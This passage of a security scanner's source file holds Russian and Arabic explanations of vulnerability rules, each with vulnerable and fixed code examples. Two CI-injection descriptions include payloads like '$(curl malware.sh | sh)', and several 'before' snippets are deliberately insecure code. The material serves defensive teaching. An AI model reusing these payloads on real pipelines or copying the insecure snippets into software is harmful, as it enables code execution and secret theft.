      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile не задаёт пользователя не-root",
    description:
      "В Dockerfile нет инструкции USER: без неё контейнер выполняется от root. Если злоумышленнику удастся выполнить код внутри контейнера (например, через уязвимую библиотеку), root внутри контейнера облегчает возможный побег на хост или более широкое воздействие на окружающую систему.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Манифест Kubernetes явно не требует выполнения от непривилегированного пользователя",
    description:
      'Нигде в манифесте нет "runAsNonRoot" (ни на уровне пода, ни контейнера): без этой настройки контейнер выполняется от пользователя, определённого в его образе — часто root по умолчанию, если сам образ этого не изменил. Явная установка в true приводит к сбою запуска пода, если образ всё равно пытается работать от root, вместо того чтобы узнать об этом только после инцидента.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Сторонний action в CI не закреплён на точной версии (commit SHA)",
    description:
      'Workflow использует сторонний action, на который ссылаются по тегу или ветке (например, "@v1", "@main"), вместо commit SHA. Тот, кто его поддерживает — или тот, кто скомпрометирует его аккаунт — может в любой момент переместить эту ссылку на другой коммит, незаметно изменив то, что выполняется в CI, с доступом к его секретам. Commit SHA всегда указывает на один и тот же код.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, закреплена на commit SHA — обновляйте SHA при обновлении версии`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow предоставляет себе все права токена вместо только тех, что использует",
    description:
      '"permissions: write-all" предоставляет GITHUB_TOKEN workflow права на запись ко всему — issues, pull request, пакетам, деплоям — даже если workflow использует лишь часть из этого. Если один из шагов workflow будет скомпрометирован (вредоносная зависимость, внедрённый скрипт), эти более широкие права увеличивают то, что сможет сделать тот, кто этим воспользуется.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # только права, которые workflow действительно использует`,
    },
  },
  "insecure-cookie-flags": {
    title: "Cookie сессии или аутентификации установлен без флагов Secure и HttpOnly",
    description:
      'Cookie с именем, напоминающим сессию/аутентификацию/токен, устанавливается без "httpOnly" и "secure" среди его опций. Без httpOnly JavaScript на странице — включая код, внедрённый через XSS — может прочитать этот cookie. Без secure его также можно отправить по незашифрованному HTTP-соединению.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Уязвимая зависимость:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Пока не известна исправленная версия — рассмотрите альтернативный пакет или следите за обновлениями проекта."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "Секрет записан напрямую в инструкции ENV или ARG Dockerfile",
    description:
      "Переменная с именем вроде password/secret/token/key имеет буквальное значение в инструкции ENV или ARG. В отличие от .env (который обычно не попадает в образ), это значение встраивается прямо в сам Docker-образ — любой, кто может его скачать или изучить историю слоёв, сможет его восстановить, даже если строка будет удалена в более поздней версии Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# передаётся так: docker build --build-arg DB_PASSWORD=*** (или, что ещё лучше,\n# через secret mount BuildKit, который не попадает в историю слоёв)`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Базовый образ Dockerfile использует тег ":latest"',
    description:
      'Инструкция FROM явно использует тег ":latest" вместо точной версии. "latest" меняется со временем: одна и та же сборка, повторённая в другой момент, может получить другую версию базового образа — невоспроизводимая сборка, и нежелательное обновление может прийти без того, чтобы кто-то это решил.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile скачивает удалённый файл через ADD вместо COPY",
    description:
      "Инструкция ADD с URL http/https скачивает файл из интернета во время сборки без проверки целостности и без того, чтобы содержимое было видно в репозитории. Если этот URL когда-либо будет скомпрометирован, сборка включит произвольный контент незаметно для того, кто читает Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<ожидаемый хеш>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Контейнер в манифесте Kubernetes запускается как privileged",
    description:
      '"privileged: true" в securityContext контейнера отключает почти всю обычную изоляцию между контейнером и хостом: контейнер может обращаться к устройствам хоста, менять его сетевую конфигурацию и во многих случаях фактически получить root-доступ к машине, на которой он выполняется. Почти никогда не нужно для обычного приложения.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # только по-настоящему необходимые capability`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Секрет записан открытым текстом в env-переменной манифеста Kubernetes",
    description:
      'Переменная окружения с именем вроде password/secret/token/key имеет буквальное значение ("value:") вместо чтения из Secret ("valueFrom.secretKeyRef"). Сам манифест — часто закоммиченный в репозиторий — таким образом содержит секрет открытым текстом, видимым даже тому, кто может только читать конфигурацию, не обязательно выполнять команды в кластере.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Значение, контролируемое внешним пользователем, проходит через вторую оболочку в пайплайне GitLab CI',
      description: 'Строка "script:" (или "before_script:"/"after_script:") использует "eval" или "sh -c"/"bash -c" вместе с предопределённой переменной GitLab, такой как заголовок merge request, сообщение коммита или имя ветки — всё это может написать любой, кто открывает merge request, даже из внешнего форка. Значение сначала разворачивается внешней оболочкой, а затем вставляется в строку, которую вторая оболочка снова интерпретирует как код: заголовок вида "$(curl malware.sh | sh)" выполнил бы произвольные команды в пайплайне с доступом ко всем секретам, доступным в этой задаче.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # передано как аргумент команде, а не внутри строки "bash -c", которая бы его переинтерпретировала`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker в пайплайне GitLab CI работает с отключённым TLS-шифрованием',
      description: 'Задача использует сервис "docker:dind" (Docker-in-Docker, нужен для сборки образов внутри пайплайна), но задаёт "DOCKER_TLS_CERTDIR" как пустую строку, полностью отключая TLS-шифрование между клиентом Docker и демоном dind. Без TLS любой, кто может достучаться до этого порта в той же внутренней сети раннера, может управлять демоном Docker — который работает с расширенными привилегиями — вместо того чтобы быть ограниченным только той задачей, которая должна его использовать.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS остаётся включённым между клиентом Docker и демоном dind — "" полностью его отключает`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'Docker-образ пайплайна GitLab CI не закреплён за конкретной версией',
      description: '"image:" пайплайна указывает на образ без тега (что равносильно ":latest") либо явно на ":latest". Тот, кто поддерживает этот образ, может заменить его содержимое в любой момент без изменений в репозитории — один и тот же пайплайн может в один день начать выполнять другой код, что концептуально тот же риск цепочки поставок, что и у GitHub Action, указанного по тегу, а не по коммиту.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # конкретный тег (или ещё лучше дайджест "node@sha256:...") вместо "latest"`,
      },
    },
},
  ar: {
  "supabase-service-role-in-client": {
    title: "مفتاح Supabase السري ينتهي في ملف مخصص للمتصفح",
    description:
      "متغيّر ببادئة عامة (مثل NEXT_PUBLIC_، VITE_) أو ملف من جهة العميل يشير إلى مفتاح دور الخدمة (service role key) الخاص بـ Supabase. هذا المفتاح يتجاوز Row Level Security: إذا انتهى داخل حزمة المتصفح، يمكن لأي شخص قراءته والتصرف كمسؤول على قاعدة البيانات.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (الخادم فقط)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "هناك كلمات مرور أو مفاتيح سرية مكتوبة مباشرة داخل الكود",
    description:
      "يبدو أن مفتاح API أو رمزًا (token) أو كلمة مرور مكتوبة كقيمة حرفية بدلاً من قراءتها من متغيّر بيئة. أي شخص يقرأ الكود المصدري (أو المستودع، إن كان عامًا) يحصل على ذلك السر.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "هناك ملف يحتوي على كلمات المرور الحقيقية للمشروع ضمن الملفات التي جرى تحليلها",
    description:
      "ملف .env بقيم حقيقية (وليس .env.example) مُدرج ضمن التحليل. إذا انتهى هذا الملف في مستودع أو في نشر عام، تصبح كل بيانات الاعتماد التي يحتويها مكشوفة.",
    fix: {
      before: `# .env (تم تضمينه بالخطأ)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (مُضمَّن)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env يبقى خارج المستودع (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "يمكن لأي شخص قراءة أو تعديل بيانات جميع المستخدمين",
    description:
      "ميزة Row Level Security معطّلة، أو أن سياسة (policy) تسمح بالوصول لأي شخص (USING (true)) دون التحقق من هوية من يقوم بالطلب. يمكن لكل مستخدم موثّق — أو حتى مجهول — قراءة أو تعديل بيانات بقية المستخدمين.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "قيمة أدخلها المستخدم تُلصق مباشرة داخل استعلام قاعدة بيانات",
    description:
      "استعلام SQL يُبنى عن طريق دمج أو إدراج سلسلة نصية مباشرة بدلاً من استخدام المعاملات (parameters). إذا كان هذا النص قادمًا — ولو بشكل غير مباشر — من مستخدم، يمكنه تغيير الاستعلام نفسه — حقن SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "كلمات المرور لا يبدو أنها محمية",
    description:
      "حقل كلمة المرور يُحفظ تمامًا كما وصل في الطلب، ولا تظهر أي دالة تجزئة (bcrypt، argon2، scrypt) في الملف. إذا تم اختراق قاعدة البيانات، تصبح كل كلمة مرور قابلة للاستخدام فورًا.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "السر المستخدم لتوقيع تسجيلات الدخول مكتوب نصًا صريحًا داخل الكود",
    description:
      "السر الممرَّر إلى jwt.sign / jwt.verify (أو متغيّر JWT_SECRET) هو قيمة حرفية في الكود بدلاً من أن يأتي من متغيّر بيئة. أي شخص يقرأه يمكنه إنشاء رموز وصول (tokens) صالحة لأي مستخدم.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "يمكن إجبار الخادم على تنفيذ أوامر خارجية",
    description:
      "دالة تنفّذ أوامر النظام (exec، execSync، spawn) تستقبل سلسلة نصية مبنية بالإدراج أو الدمج. إذا كان جزء من تلك السلسلة قادمًا من مُدخلات المستخدم، فبإمكان من يتحكم بها تنفيذ أوامر عشوائية على الخادم.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "يبدو أن جدولاً جديدًا أُنشئ دون حماية",
    description:
      "ترحيل (migration) SQL ينشئ جدولاً لكنه لا يفعّل Row Level Security لهذا الجدول نفسه في نفس الملف. طالما بقي الأمر كذلك، يبدأ الجدول دون أي قيد على من يمكنه قراءته أو الكتابة فيه.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "الموقع يقبل طلبات من أي موقع آخر",
    description:
      "رأس CORS مضبوط لقبول الطلبات من أي مصدر (*)، أو أن middleware الخاص بـ cors() مستخدَم دون قيود. يمكن لأي موقع خارجي استدعاء واجهات برمجة التطبيقات (APIs) الخاصة بك من متصفح مستخدم تم تسجيل دخوله بالفعل.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "دالة بصلاحيات إدارية لا تتحقق من هوية من يستخدمها",
    description:
      "مسار أو دالة يوحي اسمها بعمليات إدارية لا يحتوي، في الأسطر القريبة، على أي تحقق من المصادقة أو الدور. أي شخص يعرف الرابط يمكنه تشغيلها.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "يمكن إجبار الموقع على تنفيذ كود خارجي",
    description:
      "طلب HTTP صادر (fetch، axios) يستخدم مباشرة قيمة قادمة من طلب المستخدم كعنوان URL للوجهة. يمكن لمستخدم خبيث جعل خادمك يستدعي عناوين داخلية أو عشوائية — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("عنوان URL غير مسموح به")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "كلمات المرور محمية بأسلوب أصبح من السهل كسره الآن",
    description:
      "في السطر نفسه، تُطبَّق md5() أو sha1() على قيمة مرتبطة بكلمة مرور. هذه الخوارزميات سريعة جدًا في الحساب: يمكن لمهاجم يملك قاعدة البيانات تجربة مليارات كلمات المرور في الثانية.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "نص كتبه المستخدمون قد ينفّذ كودًا في المتصفح",
    description:
      "يُدرج محتوى في الصفحة كـ HTML خام (dangerouslySetInnerHTML، v-html، .innerHTML) بدلاً من نص عادي. إذا كان ذلك المحتوى يتضمن مُدخلات مستخدم، فقد يحتوي على سكربتات تُنفَّذ في متصفح من يقرأ الصفحة.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// أو، إذا احتجت HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "مساحة الملفات المرفوعة مرئية لأي شخص",
    description:
      "دلو تخزين (storage bucket — Supabase Storage، S3) مُهيَّأ كعام (public). إذا كان يحتوي على مستندات أو صور أو ملفات رفعها المستخدمون، فإن أي شخص يعرف — أو يخمّن — المسار يمكنه الوصول إليها دون أي مصادقة.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// قدّم الملفات عبر روابط موقَّعة محدودة المدة: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "رابط واحد يكفي لحذف البيانات أو تعديلها",
    description:
      "مسار GET يقوم بعملية تغيّر البيانات (المسار يحتوي على delete/remove/update/edit). طلبات GET تُنفَّذ بمجرد زيارة رابط أو تحميل صورة من موقع خارجي — نقطة الانطلاق الكلاسيكية لهجوم CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "بيانات تسجيل الدخول المحفوظة في المتصفح غير محمية جيدًا",
    description:
      "رمز وصول (access token) يُحفظ في localStorage. على عكس cookie من نوع httpOnly، يمكن لأي سكربت يعمل في الصفحة — بما في ذلك سكربت خبيث حُقن عبر XSS — قراءته وسرقته.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// عيّن الرمز كـ cookie من نوع httpOnly من جهة الخادم:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "يمكن استخدام الموقع لإعادة التوجيه إلى موقع احتيالي",
    description:
      "يعيد الموقع توجيه المستخدم إلى عنوان مأخوذ مباشرة من الطلب (query، body، params) دون التحقق من كونه نطاقًا معروفًا. رابط يبدو وكأنه يشير إلى موقعك قد يؤدي فعليًا إلى صفحة تصيّد احتيالي.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "تغيير رقم في العنوان قد يُظهر بيانات مستخدم آخر",
    description:
      "استعلام قاعدة بيانات يستخدم مباشرة معرّفًا (identifier) مأخوذًا من الرابط (req.params.id) دون التحقق، في الأسطر القريبة، من أنه يخص المستخدم الذي يقوم بالطلب. تغيير الـ id في العنوان قد يتيح الوصول إلى بيانات مستخدم آخر — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "نموذج تسجيل الدخول لا يحظر المحاولات المتكررة",
    description:
      "مسار تسجيل الدخول معرَّف في الملف، لكن لا أثر لأي middleware لتحديد معدل الطلبات (rate limiting) في الملف نفسه. دون حد أقصى للمحاولات، يمكن لمهاجم تجربة كلمات مرور بالتتابع (brute force) دون أي تباطؤ.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "كلمات مرور أو بيانات حساسة تنتهي في السجلات (logs)",
    description:
      "استدعاء لـ console.log (أو ما شابه) يتضمن متغيّرًا باسم password أو token أو secret أو apiKey. إذا انتهت هذه السجلات في خدمة خارجية أو ملف، تبقى البيانات الحساسة مكشوفة لمدة أطول بكثير من اللازم.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "يمكن قراءة أو كتابة ملف على الخادم عبر اختيار المسار من الخارج",
    description:
      'دالة تقرأ أو تكتب أو ترسل ملفًا تستقبل المسار مباشرة من قيمة في الطلب (query، body، params) دون التحقق من بقائه داخل مجلد مسموح به. يمكن لمهاجم إدراج "../" للخروج من المجلد المقصود وقراءة أو الكتابة فوق ملفات عشوائية على الخادم (مثل ملف إعدادات يحتوي على بيانات اعتماد).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("المسار غير مسموح به")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "قيمة أدخلها المستخدم تُنفَّذ كأنها كود داخل استعلام MongoDB",
    description:
      "عامل $where في MongoDB ينفّذ كود JavaScript من جهة الخادم لكل مستند — إذا كانت تلك السلسلة النصية مبنية عبر دمج قيمة قادمة من المستخدم، فإن من يتحكم بها يمكنه تنفيذ كود عشوائي ضمن سياق قاعدة البيانات، وليس فقط تغيير الفلتر كما في حقن SQL العادي.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "قيمة أدخلها المستخدم تُفسَّر كقالب (template)، وليس كبيانات",
    description:
      "دالة تقوم بترجمة/تنفيذ قالب تستقبل القالب بأكمله من قيمة في الطلب، بدلاً من استخدام قالب ثابت وتمرير البيانات فقط. يمكن لمهاجم الكتابة مباشرة بصيغة محرك القوالب (مثل {{7*7}} في Jinja2) وتنفيذ كود على الخادم — Server-Side Template Injection، وغالبًا ما يؤدي إلى تنفيذ أوامر عشوائية، وليس مجرد مشكلة عرض كما في XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "يمكن إجبار محلّل XML على قراءة ملفات أو إجراء طلبات خارجية",
    description:
      "يتم إنشاء محلّل XML (DocumentBuilderFactory) دون تعطيل الكيانات الخارجية (DOCTYPE) صراحةً في الأسطر القريبة. إذا استقبل المحلّل XML من مصدر غير موثوق، يمكن لمهاجم تعريف كيان خارجي لقراءة ملفات على الخادم أو جعله يتواصل مع عنوان من اختياره — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "مجموعة أمان (security group) في Terraform تفتح منفذًا حساسًا على الإنترنت بأكمله",
    description:
      'قاعدة تحتوي على "cidr_blocks" تشمل 0.0.0.0/0 (أي عنوان IP) قريبة من منفذ حساس — SSH (22)، RDP (3389)، أو منفذ قاعدة بيانات شائع (MySQL، Postgres، MongoDB، Redis، SQL Server). يمكن لأي شخص على الإنترنت محاولة الاتصال بتلك الخدمة، وليس فقط من ينبغي له ذلك.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # فقط شبكتك الخاصة، أو مضيف bastion\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "قاعدة جدار حماية في Google Cloud تفتح منفذًا حساسًا على الإنترنت بأكمله",
    description:
      'مورد "google_compute_firewall" بخاصية "source_ranges" تشمل 0.0.0.0/0 (أي عنوان IP) يسمح بالمرور نحو منفذ حساس — SSH (22)، RDP (3389)، أو منفذ قاعدة بيانات شائع (MySQL، Postgres، MongoDB، Redis، SQL Server). يمكن لأي شخص على الإنترنت محاولة الاتصال بتلك الخدمة، وليس فقط من ينبغي له ذلك.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # فقط شبكتك الخاصة، أو مضيف bastion\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "قاعدة شبكة في Azure تفتح منفذًا حساسًا على الإنترنت بأكمله",
    description:
      'قاعدة أمان شبكة ("azurerm_network_security_rule"، أو كتلة "security_rule" داخل "azurerm_network_security_group") بخاصية "source_address_prefix" تساوي "*" أو "0.0.0.0/0"، باتجاه "Inbound" ووصول "Allow"، قريبة من منفذ حساس — SSH (22)، RDP (3389)، أو منفذ قاعدة بيانات شائع. يمكن لأي شخص على الإنترنت محاولة الاتصال بتلك الخدمة، وليس فقط من ينبغي له ذلك.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # فقط شبكتك الخاصة، أو مضيف bastion\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "سر مكتوب كقيمة افتراضية لمتغيّر Terraform",
    description:
      'متغيّر باسم يشبه password/secret/token/key له قيمة حرفية في خاصيته "default". على عكس قيمة تُمرَّر وقت التشغيل (tfvars، متغيرات بيئة TF_VAR_*)، القيمة الافتراضية تنتهي في الكود المصدري — وإذا كان المستودع مشتركًا أو عامًا، يمكن لأي شخص رؤيتها، حتى دون الوصول إلى حالة Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # بلا قيمة افتراضية: يجب تمريرها عبر ملف .tfvars (خارج git) أو متغيّر بيئة TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "قيمة يتحكم بها مستخدم خارجي تدخل مباشرة في أمر shell ضمن CI",
    description:
      'أمر "run:" في سير عمل GitHub Actions يُدرج مباشرة قيمة مثل عنوان طلب سحب (pull request)، أو اسم فرع، أو نص تعليق — وكلها قابلة للكتابة من أي شخص يفتح طلب سحب أو تعليقًا، حتى من fork خارجي. قيمة مثل `"; curl malware.sh | sh #` ستنفّذ أوامر عشوائية في CI، مع إمكانية الوصول إلى كل الأسرار المتاحة في ذلك السير.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # يُمرَّر كمتغيّر بيئة، ولا يُدرَج مباشرة داخل الأمر أبدًا`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "سير العمل ينفّذ كود طلب سحب خارجي مع إمكانية الوصول إلى أسرار المستودع",
    description:
      'يستخدم سير العمل "pull_request_target" — الذي يعمل بصلاحيات وأسرار المستودع الأساسي حتى لطلب سحب مفتوح من fork غير مرتبط — وينفّذ checkout لكود طلب السحب نفسه ("github.event.pull_request.head")، وليس للفرع الأساسي. من يفتح طلب السحب يحصل فعليًا على تنفيذ كوده الخاص مع إمكانية الوصول إلى تلك الأسرار.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # ينفّذ checkout للفرع الأساسي، وليس لكود طلب السحب — أو استخدم\n      # "pull_request" بدلاً من "pull_request_target" إذا لم تكن بحاجة\n      # إلى الصلاحيات/الأسرار الأوسع.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "بيانات الطلب تُفكَّك تسلسليًا (deserialize) بصيغة قادرة على تنفيذ كود",
    description:
      "pickle (بايثون)، unserialize() (بي إتش بي)، ObjectInputStream (جافا)، أو مكتبة node-serialize (Node) تقوم بتفكيك تسلسلي لقيمة مأخوذة مباشرة من الطلب. على عكس JSON، يمكن لهذه الصيغ تمثيل وتنفيذ كود أثناء عملية التفكيك التسلسلي نفسها — من يتحكم بالقيمة المُرسَلة يمكنه تحقيق تنفيذ كود عشوائي على الخادم.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON لا ينفّذ أبدًا كودًا أثناء التحليل، على عكس pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'الكود يقبل صراحةً رموز JWT غير موقّعة (خوارزمية "none")',
    description:
      '"none" تظهر ضمن الخوارزميات المقبولة للتحقق من رمز JWT. الرمز بخوارزمية "none" لا يملك أي توقيع يُتحقق منه: يمكن لأي شخص بناء رمز بأي محتوى (مثل دور مسؤول) وسيقبله الكود كصالح.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // لا تُدرِج أبدًا "none" ضمن الخوارزميات المقبولة`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access معطَّل على دلو S3 مُعرَّف في Terraform",
    description:
      'واحدة أو أكثر من الحمايات الأربع في "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) مضبوطة على false. لا يعني ذلك أن الدلو عام بالفعل، لكنه يزيل شبكة أمان كانت ستمنع جعله عامًا عن طريق الخطأ مستقبلاً.',
    fix: {
